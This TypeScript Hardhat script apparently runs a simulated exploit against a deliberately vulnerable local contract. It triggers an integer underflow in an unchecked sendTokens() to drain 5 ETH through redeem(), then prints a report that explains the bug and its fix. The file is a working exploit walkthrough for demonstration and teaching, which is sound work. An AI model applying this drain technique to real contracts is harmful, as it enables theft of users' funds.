import hre from "hardhat";
import { parseEther, formatEther, ZeroAddress } from "ethers";
import { buildResult } from "./buildResult";

async function main() {
  const startTime = Date.now();
  const [, attacker] = await hre.ethers.getSigners();

  const VictimFactory = await hre.ethers.getContractFactory("OverflowVictim");
  const victim = await VictimFactory.deploy({ value: parseEther("5") });
  await victim.waitForDeployment();
  const victimAddress = await victim.getAddress();

  const PRICE: bigint = await (victim as any).PRICE();
  const initialBalance: bigint = await (victim as any).getBalance();
  const drainTokens: bigint = initialBalance / PRICE;

  const AttackerFactory = await hre.ethers.getContractFactory("OverflowAttacker");
  const attackerContract = await AttackerFactory.connect(attacker).deploy();
  await attackerContract.waitForDeployment();
  const attackerAddress = await attackerContract.getAddress();

  // Step 1: sendTokens(address(0), 1) — attacker has 0 tokens, 0-1 underflows to type(uint256).max
  const triggerData = (victim as any).interface.encodeFunctionData("sendTokens", [ZeroAddress, 1n]);
  // Step 2: redeem(drainTokens) — redeem just enough to empty the vault
  const extractData = (victim as any).interface.encodeFunctionData("redeem", [drainTokens]);

  const t1 = Date.now();
  await (attackerContract as any).connect(attacker).attack(victimAddress, triggerData, extractData);
  const endTime = Date.now();

  const finalBalance: bigint = await (victim as any).getBalance();
  const stolenAmount: bigint = initialBalance - finalBalance;
  const attackerBal: bigint = await (attackerContract as any).getBalance();

  const result = buildResult({
    contractName: "OverflowVictim",
    contractAddress: victimAddress,
    attackType: "overflow",
    targetFunction: "sendTokens()",
    severity: "Critical",
    initialBalance,
    finalBalance,
    stolenAmount,
    startTime,
    endTime,
    transactions: [
      {
        step: 1,
        description: "Attacker calls sendTokens(address(0), 1) — has 0 tokens",
        from: attacker.address,
        to: victimAddress,
        value: "0.0",
        unit: "ETH",
        timestampMs: t1,
        balanceAfter: { victim: formatEther(initialBalance), attacker: "0 ETH, type(uint256).max tokens" },
      },
      {
        step: 2,
        description: "Unchecked block: 0 - 1 wraps to type(uint256).max",
        from: attacker.address,
        to: victimAddress,
        value: "0.0",
        unit: "ETH",
        timestampMs: t1 + Math.floor((endTime - t1) * 0.5),
        balanceAfter: { victim: formatEther(initialBalance), attacker: "type(uint256).max tokens" },
      },
      {
        step: 3,
        description: `Attacker redeems ${drainTokens} tokens → drains vault`,
        from: attackerAddress,
        to: victimAddress,
        value: formatEther(stolenAmount),
        unit: "ETH",
        timestampMs: endTime,
        balanceAfter: { victim: formatEther(finalBalance), attacker: formatEther(attackerBal) },
      },
    ],
    timeline: [
      "OverflowVictim deployed with 5 ETH",
      "Attacker token balance: 0",
      "sendTokens(address(0), 1) called",
      "Unchecked subtraction: 0 - 1 = type(uint256).max",
      `Attacker redeems ${drainTokens} tokens`,
      "Vault drained",
    ],
    report: {
      vulnerabilityType: "Integer Overflow / Underflow",
      affectedFunction: "sendTokens()",
      explanation:
        "The subtraction balances[msg.sender] -= amount runs inside an unchecked block. An attacker with 0 tokens calls sendTokens with amount=1, causing 0-1 to silently underflow to type(uint256).max. They then redeem those tokens for all ETH in the vault.",
      fix: "Remove the unchecked block. In Solidity 0.8+, arithmetic is checked by default. Only use unchecked when you have explicitly verified the math cannot overflow/underflow.",
    },
  });

  process.stdout.write("SIMULATION_RESULT:" + JSON.stringify(result) + "\n");
}

main().catch(e => {
  console.error(e);
  process.exit(1);
});
